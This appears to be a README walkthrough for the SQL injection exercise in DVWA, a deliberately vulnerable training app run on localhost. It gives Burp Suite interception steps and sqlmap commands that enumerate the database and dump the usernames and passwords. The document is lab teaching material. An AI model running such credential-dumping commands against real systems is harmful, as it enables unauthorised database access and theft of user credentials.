# DVWA-Solution
DVWA vulnerable web application solutions

SQL Injection - Security Level (LOW)

http://localhost/DVWA/vulnerabilities/sqli/

![Screenshot from 2019-10-04 09-31-39](https://user-images.githubusercontent.com/15997329/66180107-9cd15680-e639-11e9-8c02-fbf504da9417.png)

1. Enter 1 in the text field and intercept the request with the Burpsuite.

![Screenshot from 2019-10-04 09-38-59](https://user-images.githubusercontent.com/15997329/66180348-b3c47880-e63a-11e9-97e3-0e44a3536f00.png)

2. Save the request to a sql.txt file

3. Open terminal and type following query
   
        - sqlmap -r sql.txt --dbs 
      - above query will return Databases names present on the sql server

4. Database name found - dvwadb (note: in user case maybe dvwa)
        
        - sqlmap -r sql.txt -D dvwadb --tables
      - above query will return Tables in the Database selected 

5. Tables found - Users and test

6. Now enumerate for Columns 

        - sqlmap -r sql.txt -D dvwadb -T users --columns
      - by enumerating columns we see username, password which looks intersesting 
      
        - sqlmap -r sql.txt -D dvwadb -T users -C username,password --dump
      - this will dump all the username and password rows

For further enumeration common dictonary based hashes crack use sqlmap further.( Have Fun ;) )
      
